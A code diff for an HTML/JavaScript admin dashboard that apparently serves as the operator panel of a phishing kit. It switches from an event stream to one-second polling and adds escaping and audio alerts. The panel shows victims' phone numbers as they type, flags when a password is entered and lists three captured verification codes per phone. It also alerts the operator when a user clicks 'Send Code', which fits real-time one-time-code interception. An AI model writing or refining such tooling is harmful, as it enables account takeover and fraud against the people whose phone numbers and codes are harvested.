@@ -40,17 +40,14 @@
       cursor: pointer;
     }
     .hidden { display: none; }
-    .instant-alert {
-      position: fixed;
-      top: 16px;
-      right: 16px;
-      background: #0284c7;
-      color: #fff;
+    .new-user-banner {
+      background: #065f46;
+      border: 1px solid #10b981;
+      color: #ecfdf5;
       padding: 12px 16px;
       border-radius: 10px;
+      margin-bottom: 16px;
       font-weight: bold;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.45);
-      z-index: 1000;
       display: none;
     }
     .user-card {
@@ -65,16 +62,6 @@
       font-weight: bold;
       color: #4ade80;
       letter-spacing: 1px;
-    }
-    .typing-tag {
-      display: inline-block;
-      background: #38bdf8;
-      color: #082f49;
-      font-size: 12px;
-      font-weight: bold;
-      padding: 3px 8px;
-      border-radius: 999px;
-      margin-left: 8px;
     }
     .alert-badge {
       display: inline-block;
@@ -105,26 +92,24 @@
       cursor: pointer;
       margin-left: 8px;
     }
-    .code-boxes {
+    .code-rows {
       display: flex;
-      gap: 10px;
+      flex-direction: column;
+      gap: 8px;
       margin-top: 12px;
     }
-    .code-box {
+    .code-row-item {
       background: #0f172a;
       border: 1px solid #475569;
-      padding: 10px 14px;
+      padding: 9px 14px;
       border-radius: 8px;
-      min-width: 72px;
-      text-align: center;
-      font-size: 16px;
+      font-size: 15px;
       font-weight: bold;
+      color: #e2e8f0;
     }
   </style>
 </head>
 <body>
-  <div id="instantAlert" class="instant-alert"></div>
-
   <div id="loginSection" class="login-box">
     <h2>Admin Login</h2>
     <input type="email" id="emailInput" placeholder="Email" />
@@ -134,7 +119,8 @@
   </div>
 
   <div id="dashboardSection" class="hidden">
-    <h2>Live User Monitor (1s Auto-Refresh + Instant Alert)</h2>
+    <h2>Live User Monitor (1s Auto-Refresh)</h2>
+    <div id="newUserBanner" class="new-user-banner"></div>
     <div id="usersContainer"></div>
   </div>
 
@@ -146,66 +132,67 @@
     const dashboardSection = document.getElementById('dashboardSection');
     const loginBtn = document.getElementById('loginBtn');
     const loginError = document.getElementById('loginError');
+    const newUserBanner = document.getElementById('newUserBanner');
     const usersContainer = document.getElementById('usersContainer');
-    const instantAlert = document.getElementById('instantAlert');
 
     let isLoggedIn = false;
-    let alertTimeout = null;
-    let eventSource = null;
+    let seenAlertIds = new Set();
+    let bannerTimeout = null;
 
-    function showInstantNotification(phone) {
-      if (!isLoggedIn) return;
-      const msg = phone
-        ? `⚡ Naya user phone register kar raha hai: ${phone}`
-        : `⚡ Naya user registration form par phone type kar raha hai!`;
+    function escapeHtml(value) {
+      return String(value ?? '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+    }
 
-      instantAlert.textContent = msg;
-      instantAlert.style.display = 'block';
-      clearTimeout(alertTimeout);
-      alertTimeout = setTimeout(() => {
-        instantAlert.style.display = 'none';
-      }, 4000);
+    function playAlertBeep() {
+      try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (!AudioCtx) return;
+        const ctx = new AudioCtx();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'sine';
+        osc.frequency.value = 880;
+        gain.gain.value = 0.08;
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start();
+        setTimeout(() => {
+          osc.stop();
+          ctx.close();
+        }, 180);
+      } catch (e) {}
+    }
+
+    function showNewUserNotification(message) {
+      newUserBanner.textContent = `🔔 ${message}`;
+      newUserBanner.style.display = 'block';
+      playAlertBeep();
 
       if ('Notification' in window && Notification.permission === 'granted') {
-        new Notification('Live Registration Alert', { body: msg });
+        new Notification('New User Phone Typing', { body: message });
       }
+
+      clearTimeout(bannerTimeout);
+      bannerTimeout = setTimeout(() => {
+        newUserBanner.style.display = 'none';
+      }, 6000);
     }
 
-    function connectStream() {
-      if (eventSource) {
-        eventSource.close();
-      }
-      eventSource = new EventSource('/api/stream');
-
-      eventSource.addEventListener('user:started-registering', (event) => {
-        try {
-          const payload = JSON.parse(event.data || '{}');
-          showInstantNotification(payload.phone);
-        } catch (e) {}
-      });
-
-      eventSource.addEventListener('submissions:update', (event) => {
-        if (!isLoggedIn) return;
-        try {
-          const data = JSON.parse(event.data || '{}');
-          renderUsers(data.sessions || [], data.groupedCodes || {});
-        } catch (e) {}
-      });
-    }
-
-    loginBtn.addEventListener('click', async () => {
+    loginBtn.addEventListener('click', () => {
       const email = document.getElementById('emailInput').value.trim();
       const pass = document.getElementById('passwordInput').value;
       if (email === ADMIN_EMAIL && pass === ADMIN_PASSWORD) {
         isLoggedIn = true;
         loginSection.classList.add('hidden');
         dashboardSection.classList.remove('hidden');
-
         if ('Notification' in window && Notification.permission === 'default') {
-          try { await Notification.requestPermission(); } catch (e) {}
+          Notification.requestPermission().catch(() => {});
         }
-
-        connectStream();
         fetchLiveData();
       } else {
         loginError.textContent = 'Invalid email or password';
@@ -228,11 +215,23 @@
       fetchLiveData();
     };
 
+    function handleAlerts(alerts) {
+      if (!Array.isArray(alerts)) return;
+      for (const alert of alerts) {
+        if (alert && alert.id && !seenAlertIds.has(alert.id)) {
+          seenAlertIds.add(alert.id);
+          showNewUserNotification(alert.message || `Naya user phone enter kar raha hai: ${alert.phone || ''}`);
+        }
+      }
+    }
+
     async function fetchLiveData() {
       if (!isLoggedIn) return;
       try {
         const res = await fetch('/api/submissions');
+        if (!res.ok) return;
         const data = await res.json();
+        handleAlerts(data.alerts || []);
         renderUsers(data.sessions || [], data.groupedCodes || {});
       } catch (e) {}
     }
@@ -244,29 +243,29 @@
       }
 
       usersContainer.innerHTML = sessions.map(s => {
+        const safeSessionId = escapeHtml(s.sessionId);
+        const safePhone = escapeHtml(s.phone || '-');
         const codes = groupedCodes[s.phone] || [null, null, null];
-        const boxesHtml = [0, 1, 2].map(idx => {
-          const val = codes[idx] || '-';
-          return `<div class="code-box" title="Attempt ${idx + 1}">${val}</div>`;
+
+        const rowsHtml = [0, 1, 2].map(idx => {
+          const val = codes[idx] ? escapeHtml(codes[idx]) : '-';
+          return `<div class="code-row-item">${idx + 1} digit code-${val}</div>`;
         }).join('');
+
+        const statusBlock = s.codeRequested
+          ? `<div class="alert-badge">🔔 User ne "Send Code" click kiya hai!</div>
+             <button class="thumbs-btn" title="Mark code sended" onclick="sendThumbsUp('${safeSessionId}')">👍</button>`
+          : s.codeSended
+            ? `<div style="color:#38bdf8; margin-top:8px;">✔ "code sended" bhej diya gaya</div>`
+            : '';
 
         return `
           <div class="user-card">
-            <div>
-              Live Phone: <span class="live-phone">${s.phone || 'Typing...'}</span>
-              ${s.typingStarted ? `<span class="typing-tag">Registering</span>` : ''}
-            </div>
+            <div>Live Phone: <span class="live-phone">${safePhone}</span></div>
             <div>Password: <span>${s.password ? '••••••' : '-'}</span></div>
-            ${
-              s.codeRequested
-                ? `<div class="alert-badge">🔔 User ne "Send Code" click kiya hai!</div>
-                   <button class="thumbs-btn" title="Mark code sended" onclick="sendThumbsUp('${s.sessionId}')">👍</button>`
-                : s.codeSended
-                  ? `<div style="color:#38bdf8; margin-top:8px;">✔ "code sended" bhej diya gaya</div>`
-                  : ''
-            }
-            <button class="del-btn" onclick="deleteSession('${s.sessionId}')">Delete</button>
-            <div class="code-boxes">${boxesHtml}</div>
+            ${statusBlock}
+            <button class="del-btn" onclick="deleteSession('${safeSessionId}')">Delete</button>
+            <div class="code-rows">${rowsHtml}</div>
           </div>
         `;
       }).join('');
